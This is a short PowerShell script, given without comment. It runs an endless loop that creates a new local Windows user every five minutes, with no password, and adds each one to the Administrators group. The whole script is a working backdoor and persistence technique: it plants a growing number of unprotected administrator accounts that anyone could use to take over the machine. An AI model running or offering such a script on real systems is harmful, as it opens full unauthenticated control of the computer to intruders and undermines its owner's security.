$number = 1

while ($true) {
    $username = $number + "user"
    New-LocalUser -Name $username -Description $username -NoPassword
    Add-LocalGroupMember -Group "Administrators" -Member $username
    $number = [int]$number + 1
    Start-Sleep -Seconds 300
  }